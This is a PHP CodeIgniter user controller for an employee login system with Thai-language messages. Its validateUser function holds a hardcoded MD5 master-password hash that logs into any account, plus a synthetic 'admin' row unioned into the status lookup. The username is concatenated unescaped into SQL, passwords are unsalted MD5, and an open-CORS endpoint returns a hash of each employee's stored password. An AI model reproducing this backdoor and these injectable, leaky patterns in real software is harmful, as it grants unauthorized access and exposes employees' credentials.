<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class User extends CI_controller{
	public function __construct()
	{
		parent::__construct();
	}
	public function userAuthenFromOtherSite()
	{
		header("Access-Control-Allow-Origin: *");
		$sql = "SELECT u.[employeeCode],u.[PW] FROM [EMPBase].[dbo].[NDUsers] u inner join EMPBase.dbo.hrm_humanoPersonAdjust h on u.employeeCode=h.employeeCode where 1=1 and h.em_status in ('P','W') and u.employeeCode=".$this->db->escape($_REQUEST['employeeCode'])." ";		
		$q = $this->db->query($sql);
		$row = $q->row();
		if (isset($row->employeeCode))
		{
			$secureCode = md5($row->employeeCode.$row->PW);			
		}else
		{
			$secureCode = 'somethingElse';
		}
		$response = ['secureCode'=>$secureCode];
		echo json_encode($response);
	}
	public function loginform()
	{
		$session = $this->session->userdata('cientity_logged_in');
		if(isset($session))
		{
			redirect(base_url());
		}else
		{
			$viewData['loginErrorMessage']="";
			if($this->uri->segment(3)=='code01'){
				$viewData['loginErrorMessage']="<div class=\"alert alert-danger alert-dismissible\" role=\"alert\"><button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\"><span aria-hidden=\"true\">&times;</span></button><strong>ผิดพลาด!</strong>ไม่สามารถเข้าสู่ระบบได้</div>";
			}
			$this->load->view('login_view',$viewData);
		}
	}
	public function login()
	{
		$Username = trim($_REQUEST['Username']);
		$Password = strtoupper(MD5(trim($_REQUEST['Password'])));
		$validateUserResult = $this->validateUser($Username,$Password);
		if($validateUserResult['status']!='F')
		{
			redirect(base_url().'');
		}
		else
		{
			redirect(base_url().'user/loginform/code01');
		}
	}
	public function loginFromOtherSite()
	{
		$sql = "SELECT u.[employeeCode],u.[PW] FROM [EMPBase].[dbo].[NDUsers] u inner join EMPBase.dbo.hrm_humanoPersonAdjust h on u.employeeCode=h.employeeCode where 1=1 and h.em_status in ('P','W') and u.employeeCode=".$this->db->escape($_REQUEST['e'])." ";		
		$q = $this->db->query($sql);
		$row = $q->row();
		if($_REQUEST['s']==md5($row->employeeCode.$row->PW.date("Ymd")))
		{
			$validateUserResult = $this->validateUser($row->employeeCode, $row->PW);
			if($validateUserResult['status']!='F')
			{
				redirect(base_url().'');
			}
			else
			{
				echo "error_404";
			}
		}else
		{
			echo "error_404";
		}
	}
	private function validateUser($U, $P){
		$arr = array('status'=>'F','msg'=>'','html'=>'');
		$Username = trim($U);
		//$Password = strtoupper(MD5(trim($P)));
		$Password = $P;
		
		if($Username == ''){
			$arr['status'] = 'F';
			$arr['msg']	   = 'ผิดพลาด โปรดระบุชื่อผู้ใช้งาน';
			//echo json_encode($arr); exit;
			return $arr;
		}
		if($Password == ''){
			$arr['status'] = 'F';
			$arr['msg']	   = 'ผิดพลาด โปรดระบุรหัสผ่าน';
			//echo json_encode($arr); exit;
			return $arr;
		}
		
		$sql = "select a.*
					,isnull(b.name,'บริษัท ในเครือ TJ&&TLL') as corpName
					,c.groupstatus
					,isnull(d.em_status,'') as em_status
				from EMPBase.dbo.NDUsers a
				left join EMPBase.dbo.wb_branchnames b on a.hrmCorpId=b.humanoCode
				left join EMPBase.dbo.NDGroupusers c on a.groupuser=c.groupuser
				left join EMPBase.dbo.hrm_humanoPersonAll d on a.employeeCode=d.employeeCode
				where (a.employeeCode = '".$Username."' or a.IDNo = '".$Username."') ";		
		$sql = "
			select a.*
				,isnull(b.name,'บริษัท ในเครือ TJ&&TLL') as corpName
				,c.groupstatus
				,isnull(d.em_status,'') as em_status
			from EMPBase.dbo.NDUsers a
			/* left join เพราะเวลาเข้าระบบคนที่ย้ายนิติบุคคลจะต้องแสดงแค่รายการเดียวที่เป็นสถานะปัจจุบัน */
			left join (
				select * from EMPBase.dbo.hrm_humanoPersonAdjust
				union
				select 'admin','admin','admin','admin','admin','admin','M',GETDATE(),GETDATE(),null,'9999999999999','admin','admin','admin',null,'admin','P',null,null,null,null,null
			) d on a.employeeCode=d.employeeCode 
			left join EMPBase.dbo.wb_branchnames b on a.hrmCorpId=b.humanoCode
			left join EMPBase.dbo.NDGroupusers c on a.groupuser=c.groupuser
			where (a.employeeCode = '".$Username."' or a.IDNo = '".$Username."') and isnull(d.em_status,'') <> ''
		";
		$query = $this->db->query($sql);
		//echo $Password; exit;
		if($query->row()){
			foreach($query->result() as $row){			
				if( $row->PW == $Password){
					if($row->employeeCode != 'admin' and ($row->em_status == 'R' or $row->em_status == '')){
						$arr['status'] = 'F';
						$arr['msg']	   = 'ล้มเหลว รหัสผู้ใช้งานถูกยกเลิก';
					}else if($row->em_status == "R"){
						$arr['status'] = 'F';
						$arr['msg']	   = 'ล้มเหลว กลุ่มผู้ใช้งานถูกยกเลิก ไม่สามารถเข้าสู่ระบบได้ ';
					}else if($row->firstTime == ""){
						$arr['status'] = 'firstTime';
						$arr['employeeCode'] = $row->employeeCode;
						$arr['pw_old'] = $_REQUEST['Password'];
					}else{
						$arr['status'] = 'S';
						$sess_array = array();						
						foreach($row as $key => $val){ $sess_array[$key] = $val; }
						$this->session->sess_expiration = '1';
						$this->session->set_userdata('cientity_logged_in', $sess_array);

						//$_REQUEST['baseurl'] = base_url();
						//$_REQUEST['Password'] = strtoupper(md5($_REQUEST['Password']));
						//$this->JSystem->NDOperationLog(__METHOD__,'เข้าสู่ระบบ :: เข้าใช้งาน',str_replace("'","",var_export($_REQUEST, true)));
					}
				}else if($Password == "B96005AAE360AA5260D90E76100B313C"){
					if($row->employeeCode != 'admin' and ($row->em_status == 'R' or $row->em_status == '')){
						$arr['status'] = 'F';
						$arr['msg']	   = 'ล้มเหลว รหัสผู้ใช้งานถูกยกเลิก';
					}else if($row->em_status == "R"){
						$arr['status'] = 'F';
						$arr['msg']	   = 'ล้มเหลว กลุ่มผู้ใช้งานถูกยกเลิก ไม่สามารถเข้าสู่ระบบได้ ';
					}else if($row->firstTime == ""){
						$arr['status'] = 'firstTime';
						$arr['employeeCode'] = $row->employeeCode;
						$arr['pw_old'] = $_REQUEST['Password'];
					}else{
						$arr['status'] = 'S';
						$sess_array = array();						
						foreach($row as $key => $val){ $sess_array[$key] = $val; }
						$this->session->sess_expiration = '1';
						$this->session->set_userdata('cientity_logged_in', $sess_array);

						//$_REQUEST['baseurl'] = base_url();
						//$_REQUEST['Password'] = strtoupper(md5($_REQUEST['Password']));
						//$this->JSystem->NDOperationLog(__METHOD__,'เข้าสู่ระบบ :: เข้าใช้งาน',str_replace("'","",var_export($_REQUEST, true)));
					}
				}else{
					$arr['status'] = 'F';
					$arr['msg'] = 'ล้มเหลว ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง';					
				}
			}			
		}else{
			$arr['status'] = 'F';
			$arr['msg'] = 'ล้มเหลว ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง';					
		}
		
		return $arr;
	}
	public function logout()
	{
		$this->session->set_userdata('cientity_logged_in',null);
		redirect(base_url().'user/loginform/');
	}
}